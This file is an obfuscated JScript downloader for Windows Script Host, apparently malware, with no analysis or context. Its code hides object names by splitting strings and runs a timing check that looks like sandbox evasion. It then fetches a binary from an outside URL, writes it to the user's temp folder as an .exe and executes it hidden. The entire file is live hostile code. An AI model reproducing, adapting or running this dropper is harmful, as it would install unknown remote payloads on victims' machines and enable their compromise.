var RN = false;
var J0 = "Create"+"Object";
var HA = function PS() {return WScript[J0]("WScript"+".Shell");}(), RI = 11;
var DW = "MSXML2"+".XMLHTTP";
var X0 = 2;
var RY = X0 - 2;
function DS(A){HA["Run"](A, RY, RY);};
function EL(){return DW + "";};
function XR(F, TO){RY = RY * 1; return F - TO;};
function UQ(){return J0;};
/*@cc_on
  @if (@_win32 || @_win64)
    RN = true;
  @end
@*/
if (RN)
{
var J = "";
function GR(){return 22;};
var L = 0; var M = 0;
function X()
{
var B = new this["Date"]();
var E = B["getUTCMilliseconds"]();
WScript["Sleep"](GR());
var B = new this["Date"]();
var LL = B["getUTCMilliseconds"]();
WScript["Sleep"](GR());
var B = new this["Date"]();
var O = B["getUTCMilliseconds"]();
var L = "UM";
L = XR(LL, E);
var M = "OS";
M = XR(O, LL);
J = "open";
return XR(L, M);
}
var W = false;
var M0 = false;
for (var U = RY; U < GR() * 1; U++){if (X() != RY){
W = true; 
M = "31" + 11 * L + M; 
M0 = true; 
break;
}}
function VP() {return ((W == true) && (W == M0)) ? 1 : RY;};
if (W && VP() && M0){
function CD() {return HA["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ZN40B64DoGQ.ex" + "e";};
 R0 = EL();
 U0 = WScript[J0](R0);
 var SI = 1;
do { 
	for (;SI;){
	try {
		if (SI == 1)
		{
			U0[J]("GET", "http://ekotrade.pl/m4ujda", false);
			U0["send"]();
			N = "Sleep";
			SI = 2;
		}
		WScript[N](GR() + 120); 
		if (U0["readystate"] < 2 * 2) continue;
		SI = RY;
		function WK(D) {var R = (1, 2, 3, 4, 5, D); return R;};
		R1 = WScript[UQ()]("ADODB.Stream");
		R0 = R1;
		R0[J]();
		R0["type"] = WK(1);
		R0["write"](U0["ResponseBody"]);
		R1["position"] = WK(RY);
		R0["Save" + "ToFile"](CD(), 2);
		R1["cl"+"ose"]();
		ZX = CD();
		DS(ZX);
	} catch(LD){};};
}while (SI);
}
}

